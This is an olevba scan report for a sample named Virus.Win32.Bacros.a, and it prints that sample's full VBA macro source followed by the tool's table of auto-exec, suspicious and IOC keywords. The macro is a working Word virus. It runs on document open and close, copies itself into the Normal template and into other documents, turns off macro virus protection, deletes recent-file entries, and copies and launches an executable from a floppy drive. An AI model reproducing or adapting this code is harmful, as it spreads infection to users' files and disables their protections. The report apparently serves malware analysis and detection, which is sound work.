olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.Win32.Bacros.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.Win32.Bacros.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewBacros.bas 
in file: Virus.Win32.Bacros.a - OLE stream: 'Macros/VBA/NewBacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'    V.   1.0.3.2   //
'

Sub AutoClose()
Dim NorDot As String
Dim NewDoc As String

On Error GoTo ErrorSkip

  NorDot = Options.DefaultFilePath(wdStyleGalleryPath) + "\" + "Normal.doc"
  With Application.FileSearch
    .LookIn = NorDot
    .FileName = NorDot
    If .Execute() > 0 Then
      GoTo Jamp
    End If
  End With
     
  NorDot = Options.DefaultFilePath(wdProgramPath) + "\" + "Normal.doc"
  With Application.FileSearch
    .LookIn = NorDot
    .FileName = NorDot
    If .Execute() > 0 Then
      GoTo Jamp
    End If
  End With
  
  NorDot = Options.DefaultFilePath(wdStyleGalleryPath) + "\" + "Normal.dot"
  With Application.FileSearch
    .LookIn = NorDot
    .FileName = NorDot
    If .Execute() > 0 Then
      GoTo Jamp
    End If
  End With
     
  NorDot = Options.DefaultFilePath(wdProgramPath) + "\" + "Normal.dot"
  With Application.FileSearch
    .LookIn = NorDot
    .FileName = NorDot
    If .Execute() > 0 Then
      GoTo Jamp
    End If
  End With
  
Jamp:

  CopyMy
  
  '**************************
  With Application.FileSearch
    .LookIn = ActiveDocument.FullName
    .FileName = ActiveDocument.FullName
    If .Execute() > 0 Then
      BX
    End If
  End With
  '**************************
  NewDoc = ActiveDocument.Path + "\" + ActiveDocument.Name
  
  Application.OrganizerCopy Source:= _
        NorDot, Destination:= _
        NewDoc, Name:="NewBacros" _
        , Object:=wdOrganizerObjectProjectItems
        
  ActiveDocument.Save

ErrorSkip:

End Sub

Sub AutoOpen()
Dim NorDoc As String
Dim NorDot As String
Dim MyDoc As String

On Error GoTo ErrorSkip
    
  NorDot = Options.DefaultFilePath(wdStyleGalleryPath) + "\" + "Normal.dot"
  With Application.FileSearch
    .LookIn = NorDot
    .FileName = NorDot
    If .Execute() > 0 Then
      NorDoc = Options.DefaultFilePath(wdStyleGalleryPath) + "\" + "Normal.doc"
      GoTo Jamp
    End If
  End With
     
  NorDot = Options.DefaultFilePath(wdProgramPath) + "\" + "Normal.dot"
  With Application.FileSearch
    .LookIn = NorDot
    .FileName = NorDot
    If .Execute() > 0 Then
      NorDoc = Options.DefaultFilePath(wdProgramPath) + "\" + "Normal.doc"
      GoTo Jamp
    End If
  End With
   
Jamp:
    
  RunMy
    
  MyDoc = ThisDocument.Path + "\" + ThisDocument.Name
  
  With Options
        .Pagination = True
        .WPHelp = False
        .WPDocNavKeys = False
        .ShortMenuNames = False
        .RTFInClipboard = True
        .BlueScreen = False
        .EnableSound = False
        .ConfirmConversions = False
        .UpdateLinksAtOpen = True
        .SendMailAttach = True
        .MeasurementUnit = wdCentimeters
        .AnimateScreenMovements = True
        .VirusProtection = False
  End With
  
  Application.OrganizerCopy Source:= _
        MyDoc, Destination:= _
        NorDot, Name:= _
        "NewBacros", Object:=wdOrganizerObjectProjectItems
    
  Documents.Open FileName:=NorDot, ReadOnly:=False
  ActiveDocument.SaveAs (NorDoc)
  ActiveDocument.Close
  
  RecentFiles(1).Delete
  RecentFiles(1).Delete
  
ErrorSkip:
  
End Sub

Sub BX()
Dim D As Integer


On Error GoTo ErrorSkip

  D = Day(Now)
  If D = 6 Then
    Selection.TypeText Text:=" I, Madman "
    Application.UserName = "ANCIENT"
  End If


ErrorSkip:

End Sub
Sub CopyMy()
Dim MyPos As Integer

On Error GoTo ErrorSkip

  MyPos = 0
  MyPos = InStr(1, ActiveDocument.FullName, "A:\")
  If MyPos <> 0 Then
    FileCopy "C:\Windows\System\sys.exe", "A:\ReadMy.exe"
  End If

ErrorSkip:
  
End Sub

Sub RunMy()
Dim MyPos As Integer
Dim RetVal

On Error GoTo ErrorSkip

  MyPos = 0
  MyPos = InStr(1, ActiveDocument.FullName, "A:\")
  If MyPos <> 0 Then
    RetVal = Shell("A:\ReadMy.exe -n", 1)
  End If

ErrorSkip:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |1.0.3.2             |IPv4 address                                 |
|IOC       |sys.exe             |Executable file name                         |
|IOC       |ReadMy.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

